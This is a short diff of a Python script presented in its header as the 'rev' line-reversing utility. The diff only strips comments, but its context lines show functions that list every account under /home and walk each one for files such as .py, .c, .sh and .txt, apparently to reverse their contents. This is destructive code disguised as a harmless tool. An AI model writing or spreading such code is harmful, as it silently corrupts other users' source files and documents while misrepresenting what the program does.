@@ -7,8 +7,6 @@
 # The rev utility copies the specified files to standard output,
 # reversing the order of characters in every line.  If no files are
 # specified, standard input is read.
-
-# x is the file being passed in
 import os
 import sys
 import random
@@ -46,21 +44,14 @@ def reverse(filename):
 
 """Get users from home directory"""
 def homies():
-    # get homies
-
-    # get all names and store in an array?
-    # iterate through array and add to variable using a count
     path = "/home"
     homies = os.listdir(path)
-
 
     for homie in homies:
         revFiles('/home/' + homie)
 
 """Gets files from user directory"""
 def revFiles(homie):                                #pass in any username
-
-    #array of extensions
     extensions = ['.py', '.txt', '.tools', '.bash', '.c', '.sh', '.h']
 
     for root, dirs, files in os.walk(homie):
